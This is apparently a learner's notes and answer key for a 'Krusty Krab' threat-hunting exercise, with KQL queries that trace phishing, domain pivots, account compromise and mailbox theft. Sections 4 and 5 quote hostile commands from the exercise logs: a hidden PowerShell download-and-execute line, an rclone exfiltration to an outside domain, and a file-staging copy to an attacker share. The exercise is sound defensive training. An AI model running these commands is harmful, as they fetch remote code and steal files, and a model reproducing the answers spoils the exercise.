@@ -1,0 +1,1132 @@
+﻿/////////////////////////////Krusty Krab: A Intro to Pivoting and Analysis
+
+Section 1: KQL 101 🐣
+
+//How many employees are in the company?
+
+Employees
+| count
+ // 675
+
+Which employee has the IP address: “192.168.1.191”?
+
+Employees
+| where ip_addr == "192.168.1.191"
+
+11/2/2021, 5:29:28 AM	Florence Holliday	Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0	192.168.1.191	florence_holliday@krustykrab.com	krustykrab.com	flholliday	Security Guard	CIBF-DESKTOP
+
+How many emails did Hector Duncan receive?
+
+Email
+| where recipient contains "Hector_Duncan"
+| count //15
+
+
+How many distinct senders were seen in the email logs from bikini-bottom-fish.com?
+
+Email
+| where sender contains "bikini-bottom-fish.com"
+| distinct sender //659
+
+How many unique websites did Christopher Lynch visit?
+
+let IPadrrchris=
+Employees
+| where email_addr contains "Christopher_Lynch"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (IPadrrchris)
+| distinct url //65
+
+
+Employees
+| where name contains "Christopher"
+| project ip_addr
+
+How many domains in the PassiveDns records contain the word “scary"?
+
+///The ip column shows what IP addresses those domains resolved to - this reveals the attacker's infrastructure.
+
+PassiveDns
+| where domain contains "scary"
+| distinct domain //20
+
+What IP did the domain scarynight.com resolve to?
+
+PassiveDns
+| where domain contains "scarynight.com"
+| distinct ip //198.174.181.37
+
+
+How many unique URLs were browsed by employees named Karen?
+
+let IPkaren=
+Employees
+| where name contains "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (IPkaren)
+| distinct url //113
+
+//////////////////******************Section 2: Just Keep Swimming 🐟
+
+How many emails were sent by nosferatu.hash@hotmail.com?
+
+Email
+| where sender contains "nosferatu.hash@hotmail.com"
+//4 mails
+
+What is the subject of the emails sent by nosferatu.hash@hotmail.com?
+//[EXTERNAL] RE: Krabby Patty Worm Detected
+
+How many of the emails sent by nosferatu.hash@hotmail.com were marked as SUSPICIOUS?
+
+Email
+| where sender contains "nosferatu.hash@hotmail.com"
+| where verdict contains "SUSPICIOUS" //2
+
+What domain was observed in the links sent by nosferatu.hash@hotmail.com?
+
+Email
+| where sender contains "nosferatu.hash@hotmail.com"
+| extend Domain = extract(@"^https?://([^/]+)", 1, link)
+///scarynight.net
+
+How many emails were sent by the email address nosferatu@gmail.com?
+
+Email
+| where sender contains "nosferatu@gmail.com"
+//7
+
+Who was the first person to receive an email from nosferatu@gmail.com? (Enter their email address)
+
+Email
+| where sender contains "nosferatu@gmail.com"
+| top 1 by timestamp asc
+| project timestamp, recipient
+//james_jefferies@krustykrab.com
+
+What was the subject of the email that james_jefferies@krustykrab.com received from nosferatu@gmail.com?
+
+Email
+| where sender contains "nosferatu@gmail.com"
+| where recipient contains "james_jefferies@krustykrab.com"
+| distinct subject
+///[EXTERNAL] FW: Confidential Memo: Krusty Krab Under Attack
+
+How many of the emails sent by nosferatu@gmail.com were blocked?
+
+Email
+| where sender contains "nosferatu@gmail.com"
+| where verdict contains "BLOCKED" ///2
+
+What was the full subject of the "urgent" emails?
+
+Email
+| where sender contains "nosferatu@gmail.com"
+| where subject contains "URGENT"
+| distinct subject
+///[EXTERNAL] FW: URGENT: Krusty Krab Secret Recipe Leaked
+
+
+What other email addresses are in the reply_to used by this actor?
+
+Email
+| where sender contains "nosferatu@gmail.com"
+| distinct reply_to ///2
+
+graveyard@hotmail.com
+nosferatu.hash@hotmail.com
+
+When did she click on the link?
+Julie Hong visited the link in one of the suspicious emails. The email contained a link to scarynight.net.
+
+let IPJhong=
+Employees
+| where name contains "Julie Hong"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (IPJhong)
+| where url contains "scarynight.net"
+///2023-03-01T09:36:22.000Z
+
+What is the IP address of the first person who clicked on a link containing the domain scarynight.net?
+
+OutboundNetworkEvents
+| where url contains "scarynight.net"
+| top 1 by timestamp asc
+| project timestamp, src_ip, url
+///192.168.1.243
+
+Who does the IP address in question 12 belong to?
+
+Employees
+| where ip_addr =="192.168.1.243"
+
+8/27/2018, 6:00:37 AM	Toni Jones	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36	192.168.1.243	toni_jones@krustykrab.com	krustykrab.com	tojones	Vendor Manager	GPYA-MACHINE
+
+//Toni Jones
+
+there appear to be multiple domains! They told us they saw some employees click on links for sleeve-dark.net
+How many people clicked on the link with the domain sleeve-dark.net?
+
+OutboundNetworkEvents
+| where url contains "sleeve-dark.net"
+| distinct src_ip
+
+192.168.0.235
+192.168.2.25
+
+Lets look for more websites with the word sleeve in the domain.
+
+How many unique employees clicked on links containing the word sleeve?
+
+OutboundNetworkEvents
+| where url contains "sleeve"
+| distinct src_ip //7
+
+192.168.2.128
+192.168.0.235
+192.168.2.25
+192.168.1.191
+192.168.1.29
+192.168.2.26
+192.168.0.72
+
+We saw the domain scarynight.net earlier. Perhaps there are more domains with that theme too?
+How many unique employees clicked on links containing the word "night"?
+
+OutboundNetworkEvents
+| where url contains "night"
+| distinct src_ip //38
+
+How many unique employees clicked on links containing the word midnight?
+
+OutboundNetworkEvents
+| where url contains "midnight"
+| distinct src_ip //3
+
+What is the full domain using the word "midnight" with the less common TLD?
+
+OutboundNetworkEvents
+| where url contains "midnight"
+| extend Domain = extract(@"^https?://([^/]+)", 1, url)
+
+///midnighttech.dev
+
+How many login attempts were there from 54.17.157.246?
+
+AuthenticationEvents
+| where src_ip =="54.17.157.246"
+| count //3
+
+When did IP 54.17.157.246 attempt to log into Zenaida Warren's account?
+
+AuthenticationEvents
+| where src_ip =="54.17.157.246"
+| where username contains "Warren"
+//2023-03-02T02:17:32.000Z
+
+What was the result of the attempted login to Zenaida Warren's account from IP 54.17.157.246?
+
+///Result: Failed Login
+
+Whose account did IP 136.61.241.165 first login to?
+
+AuthenticationEvents
+| where src_ip =="136.61.241.165"
+
+Employees
+| where username contains "timorrow" or username contains "clhoppe"
+
+//Tina Morrow and Claudia Hoppe
+
+How many requests did IP 136.61.241.165 make to the Krusty Krab website?
+
+InboundNetworkEvents
+| where src_ip =="136.61.241.165"
+//3
+
+What job related terms did IP 136.61.241.165 search for on the Krusty Krab website?
+
+https://krustykrab.com/search?query=fry%20cook%20listings
+
+/// fry cook listings
+
+Looking at the other events… it looks like actor using the IP 136.61.241.165 downloaded a zip file from Tina Morrow's account.
+
+What was the name of the zip file?
+
+
+InboundNetworkEvents
+| where src_ip =="136.61.241.165"
+| where url contains "timorrow" and url contains "zip"
+
+http://krustykrab.com/mail/readmail?login_user=timorrow%40krustykrab.com&mailbox_folder=Sent%20Mail&download=true&output=important.zip
+
+///important.zip
+
+Was there similar activity from the 54.17.157.246 address too?
+
+There was! It looks like they downloaded a file from Hector Duncan's mail account.
+
+What was the name of the file?
+
+InboundNetworkEvents
+| where src_ip =="54.17.157.246"
+| where url contains "heduncan" and url contains "download"
+
+//email.7z
+
+http://krustykrab.com/mail/readmail?login_user=heduncan%40krustykrab.com&mailbox_folder=Invoices&download=true&output=email.7z
+
+How many unique domains resolved to the IP 54.17.157.246?
+
+PassiveDns
+| where ip contains "54.17.157.246"
+|distinct domain //8
+
+nightshift.net
+legendflicker.org
+night-shift.org
+scarysleeve.org
+scary-legend.com
+legend-dark.net
+legend-shift.net
+legendshift.net
+
+How many other domains shared the same IP addresses with the domain scarysleeve.org?
+
+One of those domains looks similar to the domain we saw earlier: scarysleeve.org
+
+Step 1 check all IP connected to "scarysleeve.org
+
+PassiveDns
+| where domain contains "scarysleeve.org"
+
+198.64.168.114
+54.17.157.246
+
+Step  2 search all domain with thos both IPs
+
+PassiveDns
+| where ip contains "54.17.157.246" or ip contains "198.64.168.114"
+| where domain !contains "scarysleeve.org"
+| distinct domain //13
+
+////Section 3: Hash Slinging Slasher 
+
+How many employees were sent emails with a link to the domain nightshift.com?
+
+Email
+| where link contains "nightshift.com"
+| distinct recipient //3
+
+marie_harber@krustykrab.com
+kerri_knutson@krustykrab.com
+brad_kasky@krustykrab.com
+
+What was the subject line used for the emails from Question 1?
+
+Email
+| where link contains "nightshift.com"
+| distinct subject
+
+///[EXTERNAL] FW: Krabby Patty Worm Detected
+
+One of the three emails from Question 1 had a "CLEAN" verdict. Who was the recipient of this email? (enter their email address)
+
+Email
+| where link contains "nightshift.com"
+| where verdict contains "CLEAN"
+///brad_kasky@krustykrab.com
+
+The domain nightshift.com resolved to multiple IP addresses.
+
+Which IP did it resolve to FIRST?
+
+PassiveDns
+| where domain contains "nightshift.com"
+| take 5 //197.254.115.67
+
+
+Look back at the email address you found in Question 3.
+
+What is this employee's role?
+
+Employees
+| where email_addr contains "brad_kasky@krustykrab.com"
+//Vendor Manager
+
+What is the IP address of the employee you found in Question 3?
+
+//192.168.0.204
+
+
+Look back at the IP address you found in Question 6.
+
+What time did this employee click the link to nightshift.com? Make sure to paste the exact timestamp.
+
+ 192.168.0.204
+
+OutboundNetworkEvents
+| where src_ip contains "192.168.0.204"
+| where url contains "nightshift.com"
+
+//2023-03-02T08:49:23.000Z
+
+Look back at the IP address you found in Question 6.
+
+Who does this IP address belong to? Enter the employee's name.
+
+//192.168.0.204
+
+Employees
+| where ip_addr contains "192.168.0.204"
+
+//Brad Kasky
+
+
+///Let's do some more investigation of the first employee you found (in Questions 3/5/6).
+
+What is this employee's username?
+
+brad_kasky@krustykrab.com
+
+ Vendor Manager
+
+  192.168.0.204
+
+Employees
+| where ip_addr contains "192.168.0.204"
+
+//brkasky
+
+Let's review login (authentication) activity for the user you found in Question 9. We see two user agents used for logins to this user's account.
+
+Which user agent is used most often? Include ONLY the LAST part of the user agent (format: xxxxxxx/##.#)
+
+AuthenticationEvents
+| where username contains "brkasky"
+| distinct user_agent //Firefox/51.0
+
+
+Look back at the timestamp you found in Question 7 which tells us when the employee clicked on the suspicious link.
+
+What user agent is seen around this time (about 1 day later)? Include ONLY the LAST part of the user agent (format: xxxxxxx/##.#)
+
+datetime(2023-03-02T08:49:23Z)
+
+OutboundNetworkEvents
+| where src_ip contains "192.168.0.204"
+| where url contains "nightshift.com"
+
+datetime(2023-03-02T08:49:23Z)
+
+AuthenticationEvents
+| where username contains "brkasky"
+| where timestamp >= datetime(2023-03-02T08:49)
+//Firefox/3.6.20
+
+Which IP address did the actors use to try to login to this employee's account? (The employee from Question 9)
+
+username  brkasky
+
+AuthenticationEvents
+| where username contains "brkasky"
+| where timestamp >= datetime(2023-03-02T08:49)
+| project  src_ip, username, user_agent
+////187.111.81.175
+
+///187.111.81.175	brkasky	Mozilla/5.0 (Windows NT 5.2; az-AZ; rv:1.9.0.20) Gecko/2013-02-26 19:41:16 Firefox/3.6.20
+
+What was the result of the login attempt from the actor IP found in Question 12? (paste the exact result from ADX)
+
+AuthenticationEvents
+| where username contains "brkasky"
+| where src_ip contains "187.111.81.175"
+///Failed Login
+
+///One other employee clicked a link to nightshift.com.
+
+What is this employee's IP address? HINT: This is NOT the employee whose IP address you found in Question 6.
+
+OutboundNetworkEvents
+| where url contains "nightshift.com"
+| where src_ip !contains "192.168.0.204"
+//192.168.2.157
+
+What time did the employee from Question 14 click the link to nightshift.com? Make sure to paste the exact timestamp from ADX
+
+//2023-03-02T09:01:48.000Z
+
+What is the username for the employee you found in Question 14?
+
+let src_ipvictim=
+OutboundNetworkEvents
+| where url contains "nightshift.com"
+| where src_ip !contains "192.168.0.204"
+| distinct src_ip;
+Employees
+| where ip_addr in (src_ipvictim)
+///maharber
+
+The employee you found in Question 14 attempted to log in from one IP address.
+
+What is that IP?
+
+192.168.2.157
+
+AuthenticationEvents
+| where username  contains "maharber"
+| distinct src_ip
+///50.6.66.245
+
+How many total users logged in (or attempted to login) from the IP you found in 17?
+
+AuthenticationEvents
+| where src_ip contains "50.6.66.245" //3
+
+juhong	Successful Login
+maharber	Failed Login
+flholliday	Failed Login
+
+One employee logged in successfully from this IP you found in Question 17. What is this employee's username?
+
+//juhong
+
+What is this employee's email address? (The employee you found in Question 19)
+
+Employees
+| where username contains "juhong"
+//julie_hong@krustykrab.com
+
+
+This employee (the one you found in Question 20) received an email with almost the same subject line you found in Question 2. Who sent this email (provide the email address)?
+
+subejtc from Quest 2 "[EXTERNAL] FW: Krabby Patty Worm Detected"
+
+Email
+| where recipient contains "julie_hong@krustykrab.com"
+| where subject contains "[EXTERNAL]" ///[EXTERNAL] RE: Krabby Patty Worm Detected
+
+sender; nosferatu.hash@hotmail.com
+
+How many employees were targeted by the email found in 21?
+
+Email
+| where sender contains "nosferatu.hash@hotmail.com"
+| where subject contains "Krabby Patty Worm Detected"
+///4 
+
+zenaida_warren@krustykrab.com
+julie_hong@krustykrab.com
+jon_layman@krustykrab.com
+toni_jones@krustykrab.com
+
+The attacker email found in 22 used one domain in the links they sent. What is this domain?
+
+Email
+| where sender contains "nosferatu.hash@hotmail.com"
+| where subject contains "Krabby Patty Worm Detected"
+| extend Domain = extract(@"^https?://([^/]+)", 1, link)
+//scarynight.net
+
+The domain you found in Question 23 resolves to the IP you found in Question 17. What time was this resolution captured in Passive DNS? (paste exact timestamp)
+scarynight.net
+50.6.66.245
+
+PassiveDns
+| where domain contains "scarynight.net" and ip contains "50.6.66.245"
+
+2023-03-09T18:23:40.000Z
+
+The attackers exfiltrated (stole) data from the employee's mailbox who you found in Question 19. What time did this occur? (Hint: This exfiltration happened from the IP you found in Question 17)
+
+julie_hong@krustykrab.com  juhong   50.6.66.245
+
+
+InboundNetworkEvents
+| where src_ip   contains "50.6.66.245"
+| where url contains "juhong"
+
+http://krustykrab.com/mail/readmail?login_user=juhong%40krustykrab.com&mailbox_folder=Deleted%20Mail&download=true&output=important.rar
+
+//date . 2023-03-02T08:57:36.000Z
+
+What mailbox folder did the attackers exfiltrate data from? (Related to the employee you found in Question 19)
+
+juhong julie_hong@krustykrab.com
+
+http://krustykrab.com/mail/readmail?login_user=juhong%40krustykrab.com&mailbox_folder=Deleted%20Mail&download=true&output=important.rar
+
+mailbox_folder=Deleted%20Mail&download=true&output=important.rar
+
+////Deleted Mail
+
+The attackers likely started the reconnaissance phase of their attack on February 23 from the IP you found in Question 17. What did they search for on February 24th and March 11th?
+
+recon : 23.02 IP 50.6.66.245
+
+search on 24.02 and 11.03
+
+InboundNetworkEvents
+| where src_ip   contains "50.6.66.245"
+| where url contains "search"
+
+2/24/2023, 7:17:32 AM   https://krustykrab.com/search?query=krabby%20patty
+
+3/11/2023, 6:05:02 AM   https://krustykrab.com/search?query=krabby%20patty
+
+///krabby patty
+
+
+
+//////////////////////Section 4: Swimming with Jellyfishes 🏊
+
+At 2023-03-28T05:36 Timothy Graham received a suspicious email.
+
+Who sent this email?
+
+Employees
+| where name contains "Timothy Graham"
+
+Email 
+| where timestamp >= datetime(2023-03-28T05:36)
+| where recipient contains "timothy_graham@krustykrab.com"
+| where verdict contains "SUSPICIOUS"
+
+
+legal.vendor@protonmail.com
+
+What was the subject of the email in (1)?
+
+[EXTERNAL] Holographic meatloaf! The new hot trend!
+
+What domain was observed in the links sent in (1)?
+
+Email 
+| where timestamp >= datetime(2023-03-28T05:36)
+| where recipient contains "timothy_graham@krustykrab.com"
+| where verdict contains "SUSPICIOUS"
+| extend Domain = extract(@"^http?://([^/]+)", 1, link)
+| extend Domain = extract(@"^https?://([^/]+)", 1, link)
+
+chumsecret.biz
+
+When did Timothy Graham click on the link? (full timestamp)
+
+http://chumsecret.biz/published/search/Jellyfish_Guide.pptx
+
+Employees
+| where name contains "Timothy Graham"
+| project ip_addr, username, hostname //tigraham, 192.168.0.146
+
+OutboundNetworkEvents
+| where src_ip contains "192.168.0.146"
+| where url contains "chumsecret.biz"
+//2023-03-28T08:43:23.000Z
+
+When did the Jellyfish Guide appear on Timothy Graham's machine?
+
+FileCreationEvents
+| where filename contains "Jellyfish_Guide.pptx"
+| where username contains "tigraham"
+
+// 2023-03-28T08:44:20.000Z C:\Users\tigraham\Downloads\Jellyfish_Guide.pptx
+
+What was the (sha256) hash of the Jellyfish guide?
+
+// 4a64ffb707020fc077bb3c1f25c8cba5c0bb024679a82325baaab3374706b44e
+
+What file was created on Timothy's computer shortly after he downloaded the guide? (provide the full path)
+
+FileCreationEvents
+| where timestamp >= datetime(2023-03-28T08:44:20.000Z)
+| where username contains "tigraham"
+| take 10
+
+///C:\SecretFormular\krabbypatty.exe
+
+The file that was dropped uploaded to the malware analysis website (virustotal.com).
+
+What filename was it uploaded as? (….dll)
+
+question 7 
+
+C:\SecretFormular\krabbypatty.exe
+
+974a5796a0e00057571f51e2092524af9da7971a2933c6b9b12293cf00c6cc00
+
+search krabbypatty.exe hash  in virustotal.com
+
+filename on virustoatal is 
+
+/// CX3VBWML.dll
+
+
+What IP was observed inside of that command?
+The .exe malware in created a powershell process on Timothy's computer.
+
+
+
+ProcessEvents
+| where process_name contains "powershell" and process_commandline contains "powershell"
+| where username contains "tigraham"
+| extend IP = extract(@"\b(\d{1,3}(?:\.\d{1,3}){3})\b", 1, process_commandline)
+| project timestamp, process_commandline, IP
+
+////59.240.32.173
+
+At 2023-03-28T05:36 Timothy Graham received a suspicious email.
+
+Who sent this email?
+
+Email 
+| where timestamp >= datetime(2023-03-28T05:36)
+| where recipient contains "timothy_graham@krustykrab.com"
+| where verdict contains "SUSPICIOUS"
+| extend Domain = extract(@"^http?://([^/]+)", 1, link)
+| extend Domain = extract(@"^https?://([^/]+)", 1, link)
+
+///legal.vendor@protonmail.com
+
+How many computers at the Krusty Krab have executed powershell commands similar to (9)?
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://59.240.32.173/a'))"
+
+search for this powershell command 
+
+ProcessEvents
+| where process_commandline  contains "powershell.exe -nop -w hidden -c"
+| distinct hostname //28
+
+What was the most prevalent IP seen in (11)?
+
+ProcessEvents
+| where process_commandline  contains "powershell.exe -nop -w hidden -c"
+| extend IP = extract(@"\b(\d{1,3}(?:\.\d{1,3}){3})\b", 1, process_commandline)
+| project timestamp, process_commandline, IP
+| summarize Count=count() by IP
+| sort by Count desc
+
+/// 157.99.160.12
+
+Someone reported a suspicious command on computer. They saw a firewall rule being added to "Block Outgoing Traffic"
+
+How many machines was this command observed on?
+
+ProcessEvents
+| where process_commandline contains "Block Outgoing Traffic"
+| distinct hostname //8
+
+On which host did the activity concerning the firewall rule first occur? (provide the hostname)
+
+ProcessEvents
+| where process_commandline contains "Block Outgoing Traffic"
+
+2023-03-17T07:53:53.000Z  7EJH-LAPTOP
+
+///7EJH-LAPTOP
+
+When did the activity concerning the firewall rule first occur?
+
+2023-03-17T07:53:53.000Z
+
+Right after the suspicious firewall command was executed the attackers used a "copycat" command to steal data on the machine.
+
+What was the name of the process that they used for this command?
+
+ProcessEvents
+| where timestamp >= datetime(2023-03-17T07:53:53.000Z)
+| where hostname contains "7EJH-LAPTOP"
+
+///rclone.exe copy --transfers 12 "\\krustykrab\shared\*" computer-wifesecret.com
+
+rclone.exe
+
+
+
+To what domain did they send the data that they stole?
+
+rclone.exe copy --transfers 12 "\\krustykrab\shared\*" computer-wifesecret.com
+
+
+computer-wifesecret.com
+
+
+Right before the suspicious firewall command was executed the attackers use a command to collect sensitive files into a staging directory (where they would steal the files from).
+
+What is the name of the process they used for this?
+
+ProcessEvents
+| where timestamp <= datetime(2023-03-17T07:53:53.000Z)
+| where hostname contains "7EJH-LAPTOP"
+
+powershell.exe Get-ChildItem -Path C:\ -Recurse -Include *.docx,*.xlsx,*.pdf,*.pptx | Where-Object {$_.LastWriteTime -ge (Get-Date).AddDays(-30)} | Copy-Item -Destination "\\attacker\exfil\" -Recurse -Force
+
+powershell.exe
+
+The victim host in (14) downloaded a suspicious .exe file on the day before the suspicious firewall command was executed on their machine.
+
+What is the name of that file?
+
+FileCreationEvents
+| where hostname contains "7EJH-LAPTOP"
+| where timestamp <= datetime(2023-03-17T07:53:53.000Z)
+| where path contains "exe"
+///krabbypatty.exe
+
+
+What pdf file was observed on the victim's machine (from 14) right before the .exe file appeared? Enter the file name
+
+FileCreationEvents
+| where hostname contains "7EJH-LAPTOP"
+| where timestamp <= datetime(2023-03-17T07:53:53.000Z)
+| where path contains "pdf"
+
+
+///Free_Money.pdf
+
+
+What is the name of the user whose host was compromised (in 14)?
+
+Employees
+| where hostname contains "7EJH-LAPTOP"
+
+2/1/2022, 9:28:17 AM	Robert Vinson	Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/6.0)	192.168.2.76	robert_vinson@krustykrab.com	krustykrab.com	rovinson	Maintenance Technician	7EJH-LAPTOP
+
+///Robert Vinson
+
+When did the employee in question 21 click on a link that would have led him to download the file we saw in question 20?
+
+Employees
+| where hostname contains "7EJH-LAPTOP"
+
+Robert Vinson
+robert_vinson@krustykrab.com
+192.168.2.76
+rovinson
+
+link containing   Free_Money.pdf
+
+OutboundNetworkEvents
+| where url contains "Free_Money.pdf"
+| where src_ip contains "192.168.2.76"
+
+https://burgers-formula.biz/files/Free_Money.pdf
+
+///2023-03-16T10:55:51.000Z
+
+
+What domain was observed in the link that user in question 21 clicked?
+
+OutboundNetworkEvents
+| where url contains "Free_Money.pdf"
+| where src_ip contains "192.168.2.76"
+| extend Domain = extract(@"^https?://([^/]+)", 1, url)
+
+//burgers-formula.biz
+
+
+When did the user in question 21 receive an email with the domain from question 23?
+
+Robert Vinson
+robert_vinson@krustykrab.com
+192.168.2.76
+rovinson
+
+burgers-formula.biz
+
+Email
+| where link contains "burgers-formula.biz"
+|where recipient contains "robert_vinson@krustykrab.com"
+
+//2023-03-16T04:43:38.000Z
+
+How many domains share the same IP as the domain in question 23?
+
+burgers-formula.biz domain to check the IP
+
+// we are going to pivot
+
+
+PassiveDns
+| where domain contains "burgers-formula.biz"
+| distinct ip
+
+////213.173.220.223
+
+PassiveDns
+| where ip contains "213.173.220.223"
+| distinct domain //5
+
+
+burgers-formula.biz
+eugene-secret.org
+chumburgers.org
+burgers-secret.us
+computer-wife-burgers.us
+
+
+How many emails were sent to Krusty Krabs employees containing domains from question 25?
+
+let domainsactor= datatable(domain: string)
+[
+"burgers-formula.biz",
+"eugene-secret.org",
+"chumburgers.org",
+"burgers-secret.us",
+"computer-wife-burgers.us"
+];
+Email
+| where link  has_any (domainsactor)
+
+////10
+
+
+/////////Section 5: Y'all Too Good
+
+Employee lushearer had their account compromised on 2023-03-08. From what IP address did this occur?
+
+/// taht means the attacker as access to the computer by Authentificatzion. the actor have credentials
+//lets check how the atacor enter the computer bei checking IP
+
+
+AuthenticationEvents
+| where username contains "lushearer"
+| where timestamp between (datetime(2023-03-08) .. datetime(2023-03-09))
+| sort by timestamp asc
+
+3/8/2023, 4:38:05 AM	lushearer	54.17.157.246	Successful Login
+
+////54.17.157.246
+
+
+How many total employees were compromised (successfully or unsuccessfully) from the IP you found in Question 1?
+
+/// do a pivot with the IP 54.17.157.246 and check how many authentiication was successful
+
+AuthenticationEvents
+| where src_ip contains "54.17.157.246"
+
+///3
+
+zewarren	Failed Login
+lushearer	Successful Login
+heduncan	Successful Login
+
+What subject line was used by the threat actor identified in Questons 1 and 2 to target Hector Duncan?
+
+let domainsactor=
+PassiveDns
+| where ip contains "54.17.157.246"
+| distinct domain;
+Email
+| where recipient contains "Hector_Duncan"
+| where link has_any (domainsactor)
+| distinct subject
+
+///[EXTERNAL] IMPORTANT: Krabby Patty Security Alert
+
+What time was the first user targeted using the subject line from Question 3?
+
+Email
+| where subject contains "[EXTERNAL] IMPORTANT: Krabby Patty Security Alert"
+| sort by timestamp asc
+///2023-03-06T03:59:40.000Z
+
+
+Which sender address associated with this actor targeted the most users?
+
+
+slasher.graveyard@hotmail.com
+nosferatu@gmail.com
+nosferatu.hash@hotmail.com
+
+let domainsactor= datatable(domain: string)
+[
+"slasher.graveyard@hotmail.com",
+"nosferatu@gmail.com",
+"nosferatu.hash@hotmail.com"
+];
+Email
+| where sender has_any (domainsactor)
+| summarize Count=count() by sender
+| sort by Count desc
+
+slasher.graveyard@hotmail.com	10
+nosferatu@gmail.com	7
+nosferatu.hash@hotmail.com	4
+
+
+////slasher.graveyard@hotmail.com
+
+The attacker seems to have a lot of email addresses! We found emails with a similar subject sent from legal@gmail.com.
+
+Which subject line was used by this address to target the fewest number of users?
+
+Email
+| where sender contains "legal@gmail.com"
+//| summarize Count=count() by subject
+//| sort by Count desc
+
+//// [EXTERNAL] RE: Imagine what you could do with the Krusty Krab recipe...
+
+
+
+
+We previously observed data exfiltration from chanderson's device in section 4. The domain in the email we just found (question 6) appears familiar. The domain was also used in exfiltration!
+
+What C2 domain was used in the URL in the email and exfiltration?
+
+Employees
+| where username  contains "chanderson"
+
+Christine Anderson christine_anderson@krustykrab.com
+192.168.1.185  XYI4-LAPTOP
+
+domain
+
+burgers-formula.biz
+computer-wife-formula.net
+eugene-burgers.org
+
+let domainsactor= datatable(domain: string)
+[
+"burgers-formula.biz",
+"computer-wife-formula.net",
+"eugene-burgers.org"
+];
+Email
+| where link  has_any (domainsactor)
+| where subject contains "[EXTERNAL] RE: Imagine what you could do with the Krusty Krab recipe..."
+
+
+// https://computer-wife-formula.net/modules/images/Secret_Formula.docx
+
+legal@gmail.com
+
+
+
+
+///computer-wife-formula.net
+
+What is the sha256 of the file connecting to the C2 that was dropped on chanderson's device?
+
+
+Employees
+| where username contains "chanderson"
+
+XYI4-LAPTOP 192.168.1.185 christine_anderson@krustykrab.com
+
+FileCreationEvents
+| where hostname contains "XYI4-LAPTOP"
+| where filename contains "krabbypatty.exe" ////it was use at the beginning by other user
+
+e3970346ff7fcc3665f027d7f221968087f3c42705f5799fbc1d2811ab1ca4ea
+
+C:\ProgramData\PST\krabbypatty.exe
+
+
+What email address was used to target chanderson?
+
+
+Email
+| where recipient contains "christine_anderson@krustykrab.com"
+| where subject contains "[EXTERNAL]" and subject contains "Krusty"
+
+///legal.human_resources@yandex.com
+
+[EXTERNAL] Attention Krusty Krab employees: Your future is in danger!
+
+http://eugene-secret.us/online/search/online/online/Jellyfish_Guide.pptx
+
+
+
+How many employees were targeted using the email address identified in 9?
+
+
+Email
+| where sender contains "legal.human_resources@yandex.com"
+| where reply_to contains "legal.human_resources@yandex.com"
+| where recipient contains "@krustykrab.com"
+| distinct recipient
+///12
+
+
+An alert was sent on 2023-03-20 for a suspicious file. What is the name of the dropper file that was used to infect this device?
+
+SecurityAlerts
+| where timestamp between (datetime(2023-03-20) .. datetime(2023-03-21))
+| where description contains "suspicious"
+
+A suspicious file was detected on host CJMB-DESKTOP. Filename: krabbypatty.exe. Sha256: e3970346ff7fcc3665f027d7f221968087f3c42705f5799fbc1d2811ab1ca4ea
+
+host == CJMB-DESKTOP
+2023-03-20T09:13:46.000Z
+
+Employees
+| where hostname contains "CJMB-DESKTOP"
+
+
+FileCreationEvents
+| where hostname == "CJMB-DESKTOP"
+| where timestamp between (datetime(2023-03-19) .. datetime(2023-03-21))
+| sort by timestamp asc
+
+We have 2 files
+
+Jellyfish_Guide.pptx
+krabbypatty.exe
+
+we can check wchich one carol_raynor received
+Email
+| where recipient  contains "carol_raynor@krustykrab.com"
+| where link contains "krabbypatty.exe" or link contains "Jellyfish_Guide.pptx"
+
+http://eugene-secret.us/online/search/online/online/Jellyfish_Guide.pptx
+
+she received per Mail Jellyfish_Guide.pptx
+
+which one did she click?
+
+OutboundNetworkEvents
+| where url contains "Jellyfish_Guide.pptx" or url contains "krabbypatty.exe"
+| where src_ip contains "192.168.0.38"
+
+http://eugene-secret.us/online/search/online/online/Jellyfish_Guide.pptx
+
+ok we have the confirmation that the Jellyfish_Guide.pptx is the file dropper
+
+What time did the user who was targeted in 11 click on the link to download the dropper?
+
+OutboundNetworkEvents
+| where url contains "Jellyfish_Guide.pptx"
+| where src_ip contains "192.168.0.38"
+
+////2023-03-20T08:38:47.000Z
+
+
+User lecostain had data exfiltrated from their mailbox on the 15th. What sender email address was used by the attacker to target them?
+
+Employees
+| where username  contains "lecostain"
+
+
+Email
+| where recipient  contains "les_costain@krustykrab.com"
+| where timestamp between (datetime(2023-03-14) .. datetime(2023-03-16))
+| where subject contains "[EXTERNAL]" and subject contains "Krusty"
+| sort by timestamp asc
+
+///nosferatu@gmail.com
+
+
+
+/////IAM HERE
+
+search *
+| distinct $table
+
+
